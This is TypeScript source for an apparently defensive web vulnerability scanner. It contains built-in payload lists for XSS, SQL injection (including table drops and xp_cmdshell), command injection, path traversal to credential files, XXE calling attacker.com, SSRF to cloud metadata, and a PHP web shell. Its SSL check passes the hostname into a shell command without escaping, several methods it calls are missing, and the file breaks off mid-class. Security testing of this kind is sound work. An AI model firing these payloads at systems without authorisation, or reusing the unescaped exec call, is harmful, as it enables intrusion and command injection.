import axios from 'axios';
import * as fs from 'fs-extra';
import { exec } from 'child_process';
import { promisify } from 'util';
import { chromium, firefox, webkit, Browser, Page } from 'playwright';
import * as cheerio from 'cheerio';
import * as crypto from 'crypto-js';
import * as path from 'path';

const execAsync = promisify(exec);

export interface AdvancedDASTResult {
  id: string;
  url: string;
  method: string;
  vulnerability: string;
  category: 'injection' | 'broken_auth' | 'sensitive_data' | 'xxe' | 'broken_access' | 'security_misconfig' | 'xss' | 'insecure_deserialization' | 'components_vuln' | 'logging_monitoring';
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  confidence: 'high' | 'medium' | 'low';
  description: string;
  impact: string;
  solution: string;
  reference: string;
  evidence: string;
  request?: string;
  response?: string;
  cwe?: string;
  owasp?: string;
  wasc?: string;
  tags: string[];
  risk_score: number;
  false_positive: boolean;
}

export interface ScanConfiguration {
  target_url: string;
  scan_type: 'passive' | 'active' | 'full' | 'api' | 'ajax_spider';
  max_depth: number;
  max_duration: number;
  user_agent: string;
  authentication?: {
    type: 'form' | 'http_basic' | 'http_digest' | 'oauth2' | 'jwt' | 'session';
    credentials: any;
    login_url?: string;
    username_field?: string;
    password_field?: string;
    logged_in_indicator?: string;
    logged_out_indicator?: string;
  };
  session_management?: {
    type: 'cookie' | 'header' | 'url_parameter';
    value: string;
  };
  scan_policy?: {
    injection_tests: boolean;
    xss_tests: boolean;
    path_traversal_tests: boolean;
    sql_injection_tests: boolean;
    command_injection_tests: boolean;
    xxe_tests: boolean;
    ssrf_tests: boolean;
    file_inclusion_tests: boolean;
  };
  exclude_urls?: string[];
  include_urls?: string[];
  custom_headers?: { [key: string]: string };
  proxy?: {
    host: string;
    port: number;
    username?: string;
    password?: string;
  };
}

export interface SpiderResult {
  urls: string[];
  forms: FormInfo[];
  parameters: ParameterInfo[];
  technologies: TechnologyInfo[];
  cookies: CookieInfo[];
}

export interface FormInfo {
  action: string;
  method: string;
  inputs: InputInfo[];
  csrf_token?: string;
}

export interface InputInfo {
  name: string;
  type: string;
  value?: string;
  required: boolean;
}

export interface ParameterInfo {
  name: string;
  type: 'url' | 'post' | 'cookie' | 'header';
  value?: string;
  url: string;
}

export interface TechnologyInfo {
  name: string;
  version?: string;
  confidence: number;
  categories: string[];
}

export interface CookieInfo {
  name: string;
  value: string;
  domain: string;
  path: string;
  secure: boolean;
  httpOnly: boolean;
  sameSite?: string;
}

export class AdvancedDASTScanner {
  private browser: Browser | null = null;
  private page: Page | null = null;
  private discoveredUrls: Set<string> = new Set();
  private scanResults: AdvancedDASTResult[] = [];
  private config: ScanConfiguration | null = null;

  private readonly payloads = {
    xss: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '"><script>alert("XSS")</script>',
      "'><script>alert('XSS')</script>",
      '<iframe src=javascript:alert("XSS")></iframe>',
      '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
      '<embed src=javascript:alert("XSS")>',
      '<link rel=stylesheet href=javascript:alert("XSS")>',
      '<style>@import"javascript:alert(\'XSS\')"</style>',
      '<meta http-equiv=refresh content=0;url=javascript:alert("XSS")>',
      '<form><button formaction=javascript:alert("XSS")>Click',
      '<details open ontoggle=alert("XSS")>',
      '<marquee onstart=alert("XSS")>XSS</marquee>'
    ],
    
    sqli: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' #",
      "' OR '1'='1'/*",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "'; DROP TABLE users--",
      "' OR 1=1--",
      "' OR 1=1#",
      "' OR 1=1/*",
      "admin'--",
      "admin'#",
      "admin'/*",
      "' OR 'x'='x",
      "' AND id IS NULL; --",
      "'; EXEC xp_cmdshell('dir')--",
      "' AND 1=CONVERT(int, (SELECT @@version))--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
    ],

    command_injection: [
      "; ls -la",
      "| whoami",
      "&& cat /etc/passwd",
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "; id",
      "| id",
      "&& id",
      "; uname -a",
      "| uname -a",
      "&& uname -a",
      "`id`",
      "$(id)",
      "; sleep 10",
      "| sleep 10",
      "&& sleep 10",
      "; ping 127.0.0.1",
      "| ping 127.0.0.1",
      "&& ping 127.0.0.1"
    ],

    path_traversal: [
      "../../../etc/passwd",
      "....//....//....//etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "../../../etc/shadow",
      "../../../etc/group",
      "../../../etc/hosts",
      "../../../etc/motd",
      "../../../etc/issue",
      "../../../proc/version",
      "../../../proc/cpuinfo",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "..\\..\\..\\windows\\system32\\config\\system",
      "..\\..\\..\\windows\\win.ini",
      "..\\..\\..\\windows\\system.ini",
      "....//....//....//windows//system32//drivers//etc//hosts"
    ],

    xxe: [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
    ],

    ssrf: [
      'http://localhost:22',
      'http://localhost:3306',
      'http://localhost:6379',
      'http://127.0.0.1:22',
      'http://127.0.0.1:3306',
      'http://127.0.0.1:6379',
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/user-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'file:///etc/passwd',
      'file:///etc/hosts',
      'gopher://127.0.0.1:3306',
      'dict://127.0.0.1:11211',
      'ftp://127.0.0.1:21'
    ],

    file_inclusion: [
      'php://filter/read=convert.base64-encode/resource=index.php',
      'php://input',
      'data://text/plain,<?php system($_GET["cmd"]); ?>',
      'expect://id',
      'zip://test.zip#shell.php',
      'phar://test.phar/shell.php',
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/proc/self/environ',
      '/proc/version',
      '/proc/cmdline'
    ]
  };

  async performAdvancedScan(config: ScanConfiguration): Promise<{
    results: AdvancedDASTResult[];
    spider_results: SpiderResult;
    scan_summary: {
      total_urls: number;
      total_vulnerabilities: number;
      critical: number;
      high: number;
      medium: number;
      low: number;
      info: number;
      scan_duration: number;
      coverage: number;
    };
  }> {
    this.config = config;
    const startTime = Date.now();

    try {
      console.log('Starting advanced DAST scan...');
      
      await this.initializeBrowser();
      
      const spiderResults = await this.performSpiderScan();
      console.log(`Spider found ${spiderResults.urls.length} URLs`);

      if (config.scan_type === 'passive') {
        await this.performPassiveScan(spiderResults);
      } else if (config.scan_type === 'active' || config.scan_type === 'full') {
        await this.performActiveScan(spiderResults);
      } else if (config.scan_type === 'api') {
        await this.performAPIScan(spiderResults);
      }

      await this.performSSLTLSAnalysis();
      await this.performHTTPSecurityHeadersAnalysis();
      await this.performCookieAnalysis(spiderResults);
      await this.performClientSideAnalysis();

      const endTime = Date.now();
      const scanDuration = endTime - startTime;

      const summary = this.generateScanSummary(scanDuration);

      return {
        results: this.scanResults,
        spider_results: spiderResults,
        scan_summary: summary
      };
    } finally {
      await this.cleanup();
    }
  }

  private async initializeBrowser(): Promise<void> {
    try {
      this.browser = await chromium.launch({ 
        headless: true,
        args: ['--no-sandbox', '--disable-dev-shm-usage']
      });
      
      const context = await this.browser.newContext({
        userAgent: this.config?.user_agent || 'Mozilla/5.0 (compatible; DASTScanner/1.0)',
        ignoreHTTPSErrors: true,
        extraHTTPHeaders: this.config?.custom_headers || {}
      });

      this.page = await context.newPage();
    } catch (error) {
      console.error('Failed to initialize browser:', error);
      throw error;
    }
  }

  private async performSpiderScan(): Promise<SpiderResult> {
    const urls: string[] = [];
    const forms: FormInfo[] = [];
    const parameters: ParameterInfo[] = [];
    const technologies: TechnologyInfo[] = [];
    const cookies: CookieInfo[] = [];

    const toVisit = [this.config!.target_url];
    const visited = new Set<string>();
    let depth = 0;

    while (toVisit.length > 0 && depth < this.config!.max_depth) {
      const currentUrl = toVisit.shift()!;
      
      if (visited.has(currentUrl) || this.shouldExcludeUrl(currentUrl)) {
        continue;
      }

      visited.add(currentUrl);
      urls.push(currentUrl);

      try {
        await this.page!.goto(currentUrl, { waitUntil: 'networkidle', timeout: 30000 });
        
        const content = await this.page!.content();
        const $ = cheerio.load(content);

        const pageLinks = await this.extractLinks($, currentUrl);
        const pageForms = await this.extractForms($, currentUrl);
        const pageParams = await this.extractParameters($, currentUrl);
        const pageTech = await this.detectTechnologies(content, await this.page!.evaluate(() => window));
        const pageCookies = await this.extractCookies();

        toVisit.push(...pageLinks.filter(link => !visited.has(link)));
        forms.push(...pageForms);
        parameters.push(...pageParams);
        technologies.push(...pageTech);
        cookies.push(...pageCookies);

        depth++;
      } catch (error) {
        console.error(`Error spidering ${currentUrl}:`, error.message);
      }
    }

    return { urls, forms, parameters, technologies, cookies };
  }

  private async performPassiveScan(spiderResults: SpiderResult): Promise<void> {
    console.log('Performing passive scan...');
    
    for (const url of spiderResults.urls) {
      try {
        await this.page!.goto(url, { waitUntil: 'networkidle', timeout: 30000 });
        
        await this.checkInformationDisclosure(url);
        await this.checkMissingSecurityHeaders(url);
        await this.checkInsecureTransmission(url);
        await this.checkVersionDisclosure(url);
        await this.checkDirectoryListing(url);
        await this.checkBackupFiles(url);
        await this.checkSensitiveFiles(url);
        
      } catch (error) {
        console.error(`Error in passive scan for ${url}:`, error.message);
      }
    }
  }

  private async performActiveScan(spiderResults: SpiderResult): Promise<void> {
    console.log('Performing active scan...');
    
    await this.performPassiveScan(spiderResults);

    if (this.config?.scan_policy?.xss_tests !== false) {
      await this.performXSSTests(spiderResults);
    }

    if (this.config?.scan_policy?.sql_injection_tests !== false) {
      await this.performSQLInjectionTests(spiderResults);
    }

    if (this.config?.scan_policy?.command_injection_tests !== false) {
      await this.performCommandInjectionTests(spiderResults);
    }

    if (this.config?.scan_policy?.path_traversal_tests !== false) {
      await this.performPathTraversalTests(spiderResults);
    }

    if (this.config?.scan_policy?.xxe_tests !== false) {
      await this.performXXETests(spiderResults);
    }

    if (this.config?.scan_policy?.ssrf_tests !== false) {
      await this.performSSRFTests(spiderResults);
    }

    if (this.config?.scan_policy?.file_inclusion_tests !== false) {
      await this.performFileInclusionTests(spiderResults);
    }

    await this.performAuthenticationTests(spiderResults);
    await this.performSessionManagementTests(spiderResults);
    await this.performAccessControlTests(spiderResults);
    await this.performCSRFTests(spiderResults);
    await this.performClickjackingTests(spiderResults);
  }

  private async performAPIScan(spiderResults: SpiderResult): Promise<void> {
    console.log('Performing API-specific scan...');
    
    await this.performPassiveScan(spiderResults);
    
    await this.performJSONInjectionTests(spiderResults);
    await this.performXMLInjectionTests(spiderResults);
    await this.performMassAssignmentTests(spiderResults);
    await this.performRateLimitingTests(spiderResults);
    await this.performCORSTests(spiderResults);
    await this.performAPIVersioningTests(spiderResults);
    await this.performGraphQLTests(spiderResults);
    await this.performJWTTests(spiderResults);
  }

  private async performXSSTests(spiderResults: SpiderResult): Promise<void> {
    console.log('Testing for XSS vulnerabilities...');

    for (const form of spiderResults.forms) {
      for (const payload of this.payloads.xss) {
        try {
          await this.page!.goto(form.action, { waitUntil: 'networkidle', timeout: 30000 });
          
          for (const input of form.inputs) {
            if (input.type === 'text' || input.type === 'search' || input.type === 'url') {
              await this.page!.fill(`[name="${input.name}"]`, payload);
            }
          }

          const submitButton = await this.page!.$('input[type="submit"], button[type="submit"], button:not([type])');
          if (submitButton) {
            await submitButton.click();
            await this.page!.waitForTimeout(1000);
          }

          const content = await this.page!.content();
          if (content.includes(payload.replace(/"/g, '&quot;'))) {
            this.addVulnerability({
              id: this.generateId(),
              url: form.action,
              method: form.method.toUpperCase(),
              vulnerability: 'Cross-Site Scripting (XSS)',
              category: 'xss',
              severity: 'high',
              confidence: 'high',
              description: 'Reflected XSS vulnerability detected',
              impact: 'Attackers can execute arbitrary JavaScript in victim browsers',
              solution: 'Implement proper input validation and output encoding',
              reference: 'https://owasp.org/www-community/attacks/xss/',
              evidence: `Payload: ${payload}`,
              cwe: 'CWE-79',
              owasp: 'A03:2021 - Injection',
              tags: ['xss', 'injection', 'client-side']
            });
          }
        } catch (error) {
          console.error(`XSS test error for ${form.action}:`, error.message);
        }
      }
    }

    for (const param of spiderResults.parameters) {
      if (param.type === 'url') {
        for (const payload of this.payloads.xss.slice(0, 5)) {
          try {
            const testUrl = `${param.url}?${param.name}=${encodeURIComponent(payload)}`;
            await this.page!.goto(testUrl, { waitUntil: 'networkidle', timeout: 30000 });
            
            const content = await this.page!.content();
            if (content.includes(payload.replace(/"/g, '&quot;'))) {
              this.addVulnerability({
                id: this.generateId(),
                url: testUrl,
                method: 'GET',
                vulnerability: 'Cross-Site Scripting (XSS)',
                category: 'xss',
                severity: 'high',
                confidence: 'high',
                description: 'Reflected XSS vulnerability detected in URL parameter',
                impact: 'Attackers can execute arbitrary JavaScript in victim browsers',
                solution: 'Implement proper input validation and output encoding',
                reference: 'https://owasp.org/www-community/attacks/xss/',
                evidence: `Parameter: ${param.name}, Payload: ${payload}`,
                cwe: 'CWE-79',
                owasp: 'A03:2021 - Injection',
                tags: ['xss', 'injection', 'client-side']
              });
              break;
            }
          } catch (error) {
            console.error(`XSS parameter test error:`, error.message);
          }
        }
      }
    }
  }

  private async performSQLInjectionTests(spiderResults: SpiderResult): Promise<void> {
    console.log('Testing for SQL injection vulnerabilities...');

    for (const param of spiderResults.parameters) {
      if (param.type === 'url') {
        for (const payload of this.payloads.sqli) {
          try {
            const testUrl = `${param.url}?${param.name}=${encodeURIComponent(payload)}`;
            
            const response = await axios.get(testUrl, { 
              timeout: 10000,
              validateStatus: () => true
            });
            
            const content = response.data.toLowerCase();
            const sqlErrors = [
              'mysql_fetch_array',
              'ora-01756',
              'postgresql',
              'sqlite_exception',
              'sqlserver',
              'syntax error',
              'mysql_num_rows',
              'ora-00933',
              'sqlite error',
              'unclosed quotation mark',
              'quoted string not properly terminated'
            ];

            if (sqlErrors.some(error => content.includes(error))) {
              this.addVulnerability({
                id: this.generateId(),
                url: testUrl,
                method: 'GET',
                vulnerability: 'SQL Injection',
                category: 'injection',
                severity: 'critical',
                confidence: 'high',
                description: 'SQL injection vulnerability detected',
                impact: 'Attackers can read, modify, and delete database data',
                solution: 'Use parameterized queries and input validation',
                reference: 'https://owasp.org/www-community/attacks/SQL_Injection',
                evidence: `Parameter: ${param.name}, Payload: ${payload}`,
                cwe: 'CWE-89',
                owasp: 'A03:2021 - Injection',
                tags: ['sqli', 'injection', 'database']
              });
              break;
            }
          } catch (error) {
            console.error(`SQL injection test error:`, error.message);
          }
        }
      }
    }
  }

  private async performCommandInjectionTests(spiderResults: SpiderResult): Promise<void> {
    console.log('Testing for command injection vulnerabilities...');

    for (const param of spiderResults.parameters) {
      for (const payload of this.payloads.command_injection) {
        try {
          const testUrl = `${param.url}?${param.name}=${encodeURIComponent(payload)}`;
          
          const response = await axios.get(testUrl, { 
            timeout: 15000,
            validateStatus: () => true
          });
          
          const content = response.data.toLowerCase();
          const commandOutputs = [
            'uid=', 'gid=', 'groups=',
            'linux', 'darwin', 'windows',
            'etc/passwd', 'system32',
            'root:', 'administrator'
          ];

          if (commandOutputs.some(output => content.includes(output))) {
            this.addVulnerability({
              id: this.generateId(),
              url: testUrl,
              method: 'GET',
              vulnerability: 'Command Injection',
              category: 'injection',
              severity: 'critical',
              confidence: 'high',
              description: 'Command injection vulnerability detected',
              impact: 'Attackers can execute arbitrary system commands',
              solution: 'Avoid using user input in system commands',
              reference: 'https://owasp.org/www-community/attacks/Command_Injection',
              evidence: `Parameter: ${param.name}, Payload: ${payload}`,
              cwe: 'CWE-78',
              owasp: 'A03:2021 - Injection',
              tags: ['command-injection', 'injection', 'system']
            });
            break;
          }
        } catch (error) {
          console.error(`Command injection test error:`, error.message);
        }
      }
    }
  }

  private async performPathTraversalTests(spiderResults: SpiderResult): Promise<void> {
    console.log('Testing for path traversal vulnerabilities...');

    for (const param of spiderResults.parameters) {
      for (const payload of this.payloads.path_traversal) {
        try {
          const testUrl = `${param.url}?${param.name}=${encodeURIComponent(payload)}`;
          
          const response = await axios.get(testUrl, { 
            timeout: 10000,
            validateStatus: () => true
          });
          
          const content = response.data;
          const pathTraversalIndicators = [
            'root:x:0:0:',
            'daemon:x:1:1:',
            'bin:x:2:2:',
            '127.0.0.1',
            'localhost',
            '# Copyright',
            '[boot loader]',
            '[operating systems]'
          ];

          if (pathTraversalIndicators.some(indicator => content.includes(indicator))) {
            this.addVulnerability({
              id: this.generateId(),
              url: testUrl,
              method: 'GET',
              vulnerability: 'Path Traversal',
              category: 'broken_access',
              severity: 'high',
              confidence: 'high',
              description: 'Path traversal vulnerability detected',
              impact: 'Attackers can read sensitive system files',
              solution: 'Implement proper input validation and file access controls',
              reference: 'https://owasp.org/www-community/attacks/Path_Traversal',
              evidence: `Parameter: ${param.name}, Payload: ${payload}`,
              cwe: 'CWE-22',
              owasp: 'A01:2021 - Broken Access Control',
              tags: ['path-traversal', 'file-access', 'directory-traversal']
            });
            break;
          }
        } catch (error) {
          console.error(`Path traversal test error:`, error.message);
        }
      }
    }
  }

  private async performHTTPSecurityHeadersAnalysis(): Promise<void> {
    console.log('Analyzing HTTP security headers...');

    try {
      const response = await axios.get(this.config!.target_url, { 
        timeout: 10000,
        validateStatus: () => true
      });
      
      const headers = response.headers;
      
      const securityHeaders = {
        'content-security-policy': 'Content Security Policy (CSP) header missing',
        'x-content-type-options': 'X-Content-Type-Options header missing',
        'x-frame-options': 'X-Frame-Options header missing',
        'x-xss-protection': 'X-XSS-Protection header missing',
        'strict-transport-security': 'HTTP Strict Transport Security (HSTS) header missing',
        'referrer-policy': 'Referrer-Policy header missing',
        'permissions-policy': 'Permissions-Policy header missing'
      };

      for (const [header, message] of Object.entries(securityHeaders)) {
        if (!headers[header] && !headers[header.toLowerCase()]) {
          this.addVulnerability({
            id: this.generateId(),
            url: this.config!.target_url,
            method: 'GET',
            vulnerability: 'Missing Security Header',
            category: 'security_misconfig',
            severity: 'medium',
            confidence: 'high',
            description: message,
            impact: 'May allow various client-side attacks',
            solution: `Implement the ${header} header`,
            reference: 'https://owasp.org/www-project-secure-headers/',
            evidence: `Missing header: ${header}`,
            cwe: 'CWE-693',
            owasp: 'A05:2021 - Security Misconfiguration',
            tags: ['headers', 'configuration', 'client-side']
          });
        }
      }

      if (headers['server']) {
        this.addVulnerability({
          id: this.generateId(),
          url: this.config!.target_url,
          method: 'GET',
          vulnerability: 'Server Information Disclosure',
          category: 'sensitive_data',
          severity: 'low',
          confidence: 'high',
          description: 'Server header reveals software information',
          impact: 'Information disclosure may aid attackers',
          solution: 'Remove or obfuscate server header',
          reference: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework',
          evidence: `Server: ${headers['server']}`,
          cwe: 'CWE-200',
          owasp: 'A01:2021 - Broken Access Control',
          tags: ['information-disclosure', 'fingerprinting']
        });
      }
    } catch (error) {
      console.error('Error analyzing security headers:', error.message);
    }
  }

  private async performSSLTLSAnalysis(): Promise<void> {
    console.log('Analyzing SSL/TLS configuration...');

    const url = new URL(this.config!.target_url);
    
    if (url.protocol === 'http:') {
      this.addVulnerability({
        id: this.generateId(),
        url: this.config!.target_url,
        method: 'GET',
        vulnerability: 'Insecure Transport',
        category: 'sensitive_data',
        severity: 'high',
        confidence: 'high',
        description: 'Application not using HTTPS',
        impact: 'Data transmitted in plain text can be intercepted',
        solution: 'Implement HTTPS with proper SSL/TLS configuration',
        reference: 'https://owasp.org/www-community/controls/SecureTransport',
        evidence: 'HTTP protocol detected',
        cwe: 'CWE-319',
        owasp: 'A02:2021 - Cryptographic Failures',
        tags: ['ssl', 'tls', 'transport', 'encryption']
      });
    }

    if (url.protocol === 'https:') {
      try {
        const { stdout } = await execAsync(`openssl s_client -connect ${url.hostname}:${url.port || 443} -servername ${url.hostname} < /dev/null 2>/dev/null | openssl x509 -noout -dates`);
        
        if (stdout.includes('notAfter=')) {
          const expiryMatch = stdout.match(/notAfter=(.+)/);
          if (expiryMatch) {
            const expiryDate = new Date(expiryMatch[1]);
            const now = new Date();
            const daysUntilExpiry = (expiryDate.getTime() - now.getTime()) / (1000 * 60 * 60 * 24);
            
            if (daysUntilExpiry < 30) {
              this.addVulnerability({
                id: this.generateId(),
                url: this.config!.target_url,
                method: 'GET',
                vulnerability: 'SSL Certificate Expiring Soon',
                category: 'security_misconfig',
                severity: 'medium',
                confidence: 'high',
                description: `SSL certificate expires in ${Math.round(daysUntilExpiry)} days`,
                impact: 'Certificate expiry will cause service disruption',
                solution: 'Renew SSL certificate before expiry',
                reference: 'https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning',
                evidence: `Certificate expires: ${expiryDate.toDateString()}`,
                cwe: 'CWE-295',
                owasp: 'A02:2021 - Cryptographic Failures',
                tags: ['ssl', 'certificate', 'expiry']
              });
            }
          }
        }
      } catch (error) {
        console.error('SSL/TLS analysis error:', error.message);
      }
    }
  }

  private async performClientSideAnalysis(): Promise<void> {
    console.log('Performing client-side analysis...');

    try {
      await this.page!.goto(this.config!.target_url, { waitUntil: 'networkidle', timeout: 30000 });
      
      const clientSideVulns = await this.page!.evaluate(() => {
        const vulns = [];
        
        if (typeof eval !== 'undefined') {
          vulns.push({
            type: 'dangerous_function',
            details: 'eval() function available globally'
          });
        }
        
        const scripts = document.querySelectorAll('script[src]');
        scripts.forEach(script => {
          const src = script.getAttribute('src');
          if (src && (src.startsWith('http://') || src.includes('unpkg.com') || src.includes('jsdelivr.net'))) {
            vulns.push({
              type: 'external_script',
              details: `External script loaded: ${src}`
            });
          }
        });
        
        const inlineScripts = document.querySelectorAll('script:not([src])');
        inlineScripts.forEach(script => {
          if (script.textContent && script.textContent.includes('document.write')) {
            vulns.push({
              type: 'dangerous_function',
              details: 'document.write() usage detected'
            });
          }
        });
        
        return vulns;
      });

      for (const vuln of clientSideVulns) {
        let severity: 'critical' | 'high' | 'medium' | 'low' = 'medium';
        let cwe = 'CWE-79';
        
        if (vuln.type === 'dangerous_function') {
          severity = 'high';
          cwe = 'CWE-95';
        } else if (vuln.type === 'external_script') {
          severity = 'medium';
          cwe = 'CWE-494';
        }

        this.addVulnerability({
          id: this.generateId(),
          url: this.config!.target_url,
          method: 'GET',
          vulnerability: 'Client-Side Security Issue',
          category: 'xss',
          severity,
          confidence: 'high',
          description: vuln.details,
          impact: 'May allow client-side attacks',
          solution: 'Review and secure client-side code',
          reference: 'https://owasp.org/www-community/vulnerabilities/DOM_Based_XSS',
          evidence: vuln.details,
          cwe,
          owasp: 'A03:2021 - Injection',
          tags: ['client-side', 'javascript', 'dom']
        });
      }
    } catch (error) {
      console.error('Client-side analysis error:', error.message);
    }
  }

  private async checkInformationDisclosure(url: string): Promise<void> {
    try {
      const response = await axios.get(url, { 
        timeout: 10000,
        validateStatus: () => true
      });
      
      const content = response.data.toLowerCase();
      const sensitivePatterns = [
        /password\s*[:=]\s*['"]\w+['"]/gi,
        /api[_-]?key\s*[:=]\s*['"]\w+['"]/gi,
        /secret\s*[:=]\s*['"]\w+['"]/gi,
        /token\s*[:=]\s*['"]\w+['"]/gi,
        /database\s*[:=]\s*['"]\w+['"]/gi,
        /connection\s*[:=]\s*['"]\w+['"]/gi
      ];

      for (const pattern of sensitivePatterns) {
        const matches = content.match(pattern);
        if (matches) {
          this.addVulnerability({
            id: this.generateId(),
            url,
            method: 'GET',
            vulnerability: 'Information Disclosure',
            category: 'sensitive_data',
            severity: 'medium',
            confidence: 'medium',
            description: 'Sensitive information detected in response',
            impact: 'Sensitive data exposure',
            solution: 'Remove sensitive information from responses',
            reference: 'https://owasp.org/www-community/Improper_Error_Handling',
            evidence: matches[0],
            cwe: 'CWE-200',
            owasp: 'A01:2021 - Broken Access Control',
            tags: ['information-disclosure', 'sensitive-data']
          });
        }
      }
    } catch (error) {
      console.error(`Information disclosure check error for ${url}:`, error.message);
    }
  }

  private async extractLinks($: cheerio.CheerioAPI, baseUrl: string): Promise<string[]> {
    const links: string[] = [];
    
    $('a[href]').each((_, element) => {
      const href = $(element).attr('href');
      if (href) {
        try {
          const absoluteUrl = new URL(href, baseUrl).href;
          if (absoluteUrl.startsWith(this.config!.target_url)) {
            links.push(absoluteUrl);
          }
        } catch (error) {
          // Invalid URL, skip
        }
      }
    });

    return [...new Set(links)];
  }

  private async extractForms($: cheerio.CheerioAPI, baseUrl: string): Promise<FormInfo[]> {
    const forms: FormInfo[] = [];
    
    $('form').each((_, element) => {
      const action = $(element).attr('action') || baseUrl;
      const method = $(element).attr('method') || 'GET';
      const inputs: InputInfo[] = [];
      
      $(element).find('input, textarea, select').each((_, input) => {
        const name = $(input).attr('name');
        const type = $(input).attr('type') || 'text';
        const value = $(input).attr('value');
        const required = $(input).attr('required') !== undefined;
        
        if (name) {
          inputs.push({ name, type, value, required });
        }
      });
      
      const csrfToken = $(element).find('input[name*="csrf"], input[name*="token"]').attr('value');
      
      forms.push({
        action: new URL(action, baseUrl).href,
        method: method.toUpperCase(),
        inputs,
        csrf_token: csrfToken
      });
    });

    return forms;
  }

  private async extractParameters($: cheerio.CheerioAPI, url: string): Promise<ParameterInfo[]> {
    const parameters: ParameterInfo[] = [];
    
    const urlObj = new URL(url);
    urlObj.searchParams.forEach((value, name) => {
      parameters.push({
        name,
        type: 'url',
        value,
        url
      });
    });

    return parameters;
  }

  private async detectTechnologies(content: string, windowObj: any): Promise<TechnologyInfo[]> {
    const technologies: TechnologyInfo[] = [];
    
    const patterns = [
      { name: 'jQuery', pattern: /jquery[.-]?(\d+\.?\d*\.?\d*)/i, categories: ['javascript'] },
      { name: 'React', pattern: /react[.-]?(\d+\.?\d*\.?\d*)/i, categories: ['javascript'] },
      { name: 'Angular', pattern: /angular[.-]?(\d+\.?\d*\.?\d*)/i, categories: ['javascript'] },
      { name: 'Vue.js', pattern: /vue[.-]?(\d+\.?\d*\.?\d*)/i, categories: ['javascript'] },
      { name: 'Bootstrap', pattern: /bootstrap[.-]?(\d+\.?\d*\.?\d*)/i, categories: ['css'] },
      { name: 'PHP', pattern: /php[\/\s](\d+\.?\d*\.?\d*)/i, categories: ['backend'] },
      { name: 'Apache', pattern: /apache[\/\s](\d+\.?\d*\.?\d*)/i, categories: ['server'] },
      { name: 'Nginx', pattern: /nginx[\/\s](\d+\.?\d*\.?\d*)/i, categories: ['server'] }
    ];

    for (const pattern of patterns) {
      const match = content.match(pattern.pattern);
      if (match) {
        technologies.push({
          name: pattern.name,
          version: match[1],
          confidence: 80,
          categories: pattern.categories
        });
      }
    }

    return technologies;
  }

  private async extractCookies(): Promise<CookieInfo[]> {
    const cookies: CookieInfo[] = [];
    
    try {
      const pageCookies = await this.page!.context().cookies();
      
      for (const cookie of pageCookies) {
        cookies.push({
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path,
          secure: cookie.secure,
          httpOnly: cookie.httpOnly,
          sameSite: cookie.sameSite
        });
      }
    } catch (error) {
      console.error('Error extracting cookies:', error.message);
    }

    return cookies;
  }

  private shouldExcludeUrl(url: string): boolean {
    if (this.config?.exclude_urls) {
      return this.config.exclude_urls.some(pattern => url.includes(pattern));
    }
    return false;
  }

  private addVulnerability(vuln: Omit<AdvancedDASTResult, 'risk_score' | 'false_positive'>): void {
    const riskScore = this.calculateRiskScore(vuln.severity, vuln.confidence);
    
    this.scanResults.push({
      ...vuln,
      risk_score: riskScore,
      false_positive: false
    });
  }

  private calculateRiskScore(severity: string, confidence: string): number {
    const severityScores = { critical: 10, high: 8, medium: 5, low: 2, info: 1 };
    const confidenceScores = { high: 1.0, medium: 0.7, low: 0.3 };
    
    const severityScore = severityScores[severity as keyof typeof severityScores] || 1;
    const confidenceScore = confidenceScores[confidence as keyof typeof confidenceScores] || 0.5;
    
    return Math.round(severityScore * confidenceScore);
  }

  private generateId(): string {
    return crypto.MD5(Date.now().toString() + Math.random().toString()).toString().substring(0, 8);
  }

  private generateScanSummary(scanDuration: number): any {
    const total = this.scanResults.length;
    const critical = this.scanResults.filter(r => r.severity === 'critical').length;
    const high = this.scanResults.filter(r => r.severity === 'high').length;
    const medium = this.scanResults.filter(r => r.severity === 'medium').length;
    const low = this.scanResults.filter(r => r.severity === 'low').length;
    const info = this.scanResults.filter(r => r.severity === 'info').length;

    return {
      total_urls: this.discoveredUrls.size,
      total_vulnerabilities: total,
      critical,
      high,
      medium,
      low,
      info,
      scan_duration: scanDuration,
      coverage: Math.min(100, (this.discoveredUrls.size / 50) * 100)
    };
  }

  private async cleanup(): Promise<void> {
    try {
      if (this.browser) {
        await this.browser.close();
      }
    } catch (error) {
      console.error('Error during cleanup:', error);
    }
  }

  // Placeholder methods for additional scan types
  private async performCSRFTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for CSRF testing
  }

  private async performClickjackingTests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for clickjacking testing
  }

  private async performXXETests(spiderResults: SpiderResult): Promise<void> {
    // Implementation for XXE testing
  }

